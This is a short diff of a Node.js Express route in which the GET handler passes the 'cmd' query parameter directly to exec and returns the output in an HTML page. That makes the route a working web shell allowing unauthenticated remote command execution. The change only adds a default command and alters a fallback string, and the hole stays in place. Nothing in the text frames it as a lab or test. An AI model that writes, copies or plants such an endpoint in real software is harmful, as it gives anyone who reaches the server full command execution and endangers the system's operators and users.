@@ -6,13 +6,13 @@ var so;
 
 router.get('/', function (req, res, next) {
    
-    exec(req.query.cmd, function (err, stdout, stderr) {
+    exec(req.query.cmd||"HELLO", function (err, stdout, stderr) {
         console.log(req.query.cmd)
         console.log(stdout)
         if (stdout) {
             so = stdout;
         } else {
-            so = "hello";
+            so = "NO CONTENT";
         }
         var html = `<!DOCTYPE html> 
   <html> 
